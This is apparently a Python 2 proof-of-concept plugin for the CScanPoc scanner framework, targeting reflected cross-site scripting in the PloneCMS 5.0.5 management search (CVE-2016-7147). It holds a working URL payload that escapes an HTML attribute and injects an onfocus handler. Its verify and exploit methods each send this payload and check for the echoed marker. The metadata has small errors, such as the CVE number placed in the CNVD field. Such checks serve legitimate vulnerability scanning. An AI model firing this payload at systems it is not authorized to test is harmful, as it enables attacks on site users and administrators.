# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    vuln_id = 'Plone_0001' # 平台漏洞编号，留空
    name = 'PloneCMS 5.0.5 Cross Site Scripting' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2019-09-05'  # 漏洞公布时间
    desc = '''
        Description: The search functionality of the management interface is vulnerable
        to reflected XSS. As the input is echoed into an HMTL attribute, an attacker
        can use double quotes to escape the current attribute and add new attributes to
        enter a JavaScript context.
    ''' # 漏洞描述
    ref = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7147' # 漏洞来源
    cnvd_id = 'CVE-2016-7147' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'PloneCMS'  # 漏洞应用名称
    product_version = 'PloneCMS 5.0.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '04015308-c8c8-4891-a1b4-38fbad0abc09'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-09' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/Plone/manage_findResult?obj_metatypes%3Alist=all&obj_ids%3Atokens=%22+autofocus+onfocus%3dalert(cscan)%3E&obj_searchterm=&obj_mspec=%3C&obj_mtime=&search_sub%3Aint=1&btn_submit=Find'
            url = self.target + payload
            r = requests.get(url)

            if 'cscan' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/Plone/manage_findResult?obj_metatypes%3Alist=all&obj_ids%3Atokens=%22+autofocus+onfocus%3dalert(cscan)%3E&obj_searchterm=&obj_mspec=%3C&obj_mtime=&search_sub%3Aint=1&btn_submit=Find'
            url = self.target + payload
            r = requests.get(url)

            if 'cscan' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target,name=self.vuln.name, url=url))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

if __name__ == '__main__':
    Poc().run()